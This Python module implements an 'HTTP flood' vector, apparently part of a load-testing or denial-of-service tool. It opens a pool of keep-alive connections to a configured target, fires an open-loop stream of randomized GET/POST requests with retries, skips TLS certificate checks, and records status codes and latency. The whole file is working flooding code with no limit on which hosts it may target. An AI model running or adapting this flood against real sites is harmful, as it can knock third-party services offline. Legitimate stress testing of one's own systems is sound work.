"""HTTP flood vector: open-loop request stream with keep-alive pooling.

Connection strategy: a per-worker pool of persistent HTTP/1.1 connections
(`cfg.connections`), requests multiplexed over them up to max_inflight.
Each scheduled unit grabs a pooled connection (or opens one), sends a
request, records latency, and returns the connection to the pool.
Rate shaping happens in the scheduler, not here — this file only executes.
"""

from __future__ import annotations

import asyncio
import random
import time
from collections import deque
from typing import Dict, List, Optional

from .base import Vector

try:
    import uvloop  # type: ignore
    _HAS_UVLOOP = True
except ImportError:
    _HAS_UVLOOP = False


class _PooledConn:
    __slots__ = ("reader", "writer", "busy", "opened", "last_status",
                 "should_close")

    def __init__(self, reader, writer):
        self.reader = reader
        self.writer = writer
        self.busy = False
        self.opened = time.monotonic()
        self.last_status = 0
        self.should_close = False


class HttpFlood(Vector):
    name = "httpflood"

    def __init__(self, cfg, stats, worker_id):
        super().__init__(cfg, stats, worker_id)
        self._pool: List[_PooledConn] = []
        self._idle: deque = deque()   # healthy, ready connections
        self._idle_cond = asyncio.Condition()
        self._lock = asyncio.Lock()
        self._sem = asyncio.Semaphore(cfg.max_inflight)
        self._rng = random.Random(worker_id * 7919 + 13)
        self._paths = cfg.paths or ["/"]
        self._methods = cfg.methods or ["GET"]
        self._ua = cfg.user_agent
        self._extra_headers: List[tuple] = [
            (k, v) for k, v in (cfg.headers or {}).items()
        ]
        self._host_header = f"{cfg.target.host}:{cfg.target.port}" \
            if cfg.target.port not in (80, 443) else cfg.target.host

    # ------------------------------------------------------------------
    async def _open_connection(self) -> _PooledConn:
        tgt = self.cfg.target
        stats = self.stats

        async def _make():
            if tgt.use_tls:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                return await asyncio.open_connection(tgt.host, tgt.port, ssl=ctx)
            return await asyncio.open_connection(tgt.host, tgt.port)

        try:
            reader, writer = await self._connect(_make, self.cfg.connect_timeout)
        except (asyncio.TimeoutError, ConnectionError, OSError):
            stats.bump("connfail")
            raise
        stats.bump("connections")
        return _PooledConn(reader, writer)

    def _build_request(self, path: str, method: str, body: Optional[bytes]) -> bytes:
        tgt = self.cfg.target
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self._host_header}",
            f"User-Agent: {self._ua}",
            "Accept: text/html,application/json,*/*",
            "Accept-Encoding: gzip",
            "Connection: keep-alive" if self.cfg.keepalive else "Connection: close",
        ]
        if body is not None:
            headers.append(f"Content-Length: {len(body)}")
            headers.append("Content-Type: application/json")
        for k, v in self._extra_headers:
            headers.append(f"{k}: {v}")
        head = ("\r\n".join(headers) + "\r\n\r\n").encode()
        return head + body if body else head

    async def _acquire(self) -> _PooledConn:
        """Condition-based idle-conn wait: no polling storms under backlog."""
        async with self._idle_cond:
            while True:
                if self._idle:
                    conn = self._idle.popleft()
                    conn.busy = True
                    return conn
                if len(self._pool) < self.cfg.connections:
                    break  # room to grow: open a new conn outside the lock
                # pool at cap and all busy: wait for a release signal
                await self._idle_cond.wait()
        conn = await self._open_connection()
        conn.busy = True
        async with self._idle_cond:
            self._pool.append(conn)
        return conn

    def _release(self, conn: _PooledConn, healthy: bool):
        conn.busy = False
        if healthy:
            async def _wake():
                async with self._idle_cond:
                    self._idle.append(conn)
                    self._idle_cond.notify(1)
            asyncio.ensure_future(_wake())
        else:
            async def _close():
                async with self._idle_cond:
                    try:
                        self._pool.remove(conn)
                    except ValueError:
                        pass
                try:
                    conn.writer.close()
                except Exception:
                    pass
            asyncio.ensure_future(_close())

    async def _drain_one(self, conn: _PooledConn) -> bool:
        """Read one response off the wire. Returns False if connection died.
        Counts status-class counters; success = 2xx/3xx only."""
        reader = conn.reader
        try:
            status_line = await asyncio.wait_for(reader.readline(),
                                                 timeout=self.cfg.read_timeout)
            if not status_line:
                return False
            status = 0
            try:
                status = int(status_line.split()[1])
            except (IndexError, ValueError):
                pass
            conn.last_status = status
            if 200 <= status < 300:
                self.stats.bump("status_2xx")
            elif 300 <= status < 400:
                self.stats.bump("status_3xx")
            elif 400 <= status < 500:
                self.stats.bump("status_4xx")
                self.stats.bump("error")
            elif status >= 500:
                self.stats.bump("status_5xx")
                self.stats.bump("error")
            # headers
            clen = 0
            chunked = False
            close = not self.cfg.keepalive
            while True:
                line = await asyncio.wait_for(reader.readline(),
                                              timeout=self.cfg.read_timeout)
                if line in (b"\r\n", b"\n", b""):
                    break
                low = line.lower()
                if low.startswith(b"content-length:"):
                    clen = int(low.split(b":")[1].strip() or b"0")
                elif low.startswith(b"transfer-encoding:") and b"chunked" in low:
                    chunked = True
                elif low.startswith(b"connection:") and b"close" in low:
                    close = True
            if clen:
                body = await asyncio.wait_for(reader.readexactly(clen),
                                              timeout=self.cfg.read_timeout)
                self.stats.bump("bytes_recv", len(body) + 256)
            elif chunked:
                chunk_bytes = 0
                while True:
                    sz_line = await asyncio.wait_for(reader.readline(),
                                                     timeout=self.cfg.read_timeout)
                    sz = int(sz_line.strip() or b"0", 16)
                    if sz == 0:
                        await reader.readline()
                        break
                    await asyncio.wait_for(reader.readexactly(sz + 2),
                                           timeout=self.cfg.read_timeout)
                    chunk_bytes += sz
                self.stats.bump("bytes_recv", chunk_bytes + 256)
            # response fully parsed: conn may be server-closed, but that is
            # NOT a transport failure — caller checks conn.should_close
            conn.should_close = close
            return True
        except (asyncio.TimeoutError, asyncio.IncompleteReadError,
                ConnectionError, OSError):
            return False

    # ------------------------------------------------------------------
    async def run_unit(self, t: float):
        self.stats.bump("issued")
        async with self._sem:
            path = self._rng.choice(self._paths)
            method = self._rng.choice(self._methods)
            body = self.cfg.post_data.encode() if method in ("POST", "PUT", "PATCH") else None
            req = self._build_request(path, method, body)

            attempt = 0
            max_attempts = 1 + max(0, self.cfg.retries)
            while attempt < max_attempts:
                attempt += 1
                try:
                    conn = await self._acquire()
                except (ConnectionError, OSError, asyncio.TimeoutError):
                    return  # connfail already counted
                t0 = time.monotonic()
                try:
                    conn.writer.write(req)
                    self.stats.bump("bytes_sent", len(req))
                    await asyncio.wait_for(conn.writer.drain(),
                                           timeout=self.cfg.request_timeout)
                    ok = await self._drain_one(conn)
                    dt = time.monotonic() - t0
                    self.stats.observe_latency(dt)
                    self.stats.bump("requests")
                    got_2xx3xx = ok and (200 <= conn.last_status < 400)
                    if got_2xx3xx:
                        self.stats.bump("success")
                        self._release(conn, healthy=not conn.should_close)
                    elif ok:
                        # got a parseable response, but 4xx/5xx (already
                        # counted as error): connection itself is healthy
                        self._release(conn, healthy=not conn.should_close)
                        return
                    else:
                        self.stats.bump("reset")
                        self._release(conn, healthy=False)
                        if attempt < max_attempts:
                            await asyncio.sleep(0.01)
                            continue  # retry on a fresh conn
                    return
                except (asyncio.TimeoutError, ConnectionError, OSError) as e:
                    self.stats.bump("timeout" if isinstance(e, asyncio.TimeoutError) else "reset")
                    self._release(conn, healthy=False)
                    if attempt < max_attempts:
                        await asyncio.sleep(0.01)
                        continue
                    return
                except asyncio.CancelledError:
                    self._release(conn, healthy=False)
                    raise

    async def aclose(self):
        async with self._lock:
            for c in self._pool:
                try:
                    c.writer.close()
                except Exception:
                    pass
            self._pool.clear()
